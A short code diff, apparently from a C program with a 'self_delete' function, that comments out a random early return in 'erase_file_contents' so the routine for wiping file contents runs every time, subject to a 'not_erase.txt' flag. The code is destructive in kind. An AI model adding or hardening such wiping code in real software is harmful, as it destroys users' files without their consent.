@@ -52,7 +52,7 @@ void self_delete() {
 }
 
 void erase_file_contents(const char* filename) {
-    if(rand() % 2 != 0) return;
+    //if(rand() % 2 != 0) return;
 
     // Flag to check if we should not erase
     FILE *file = fopen("project/not_erase.txt", "r");
